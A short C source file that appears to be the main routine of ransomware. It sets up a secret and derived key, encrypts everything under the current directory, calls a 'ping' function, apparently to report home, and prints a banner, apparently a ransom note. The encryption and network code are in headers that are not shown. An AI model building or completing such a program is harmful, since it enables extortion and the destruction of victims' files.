const int kFileId = 4;
#include <stdio.h>
#include <sys/param.h>
#include "assert.h"
#include "secret.h"
#include "encrypt.h"
#include "ping.h"

int main() {
  initsecret();
  derive();
  initbanner();

  char path[PATH_MAX] = ".";
  encryptall(path);

  ping();
  assert(fputs(g_banner, stdout) >= 0);
  return 0;
}
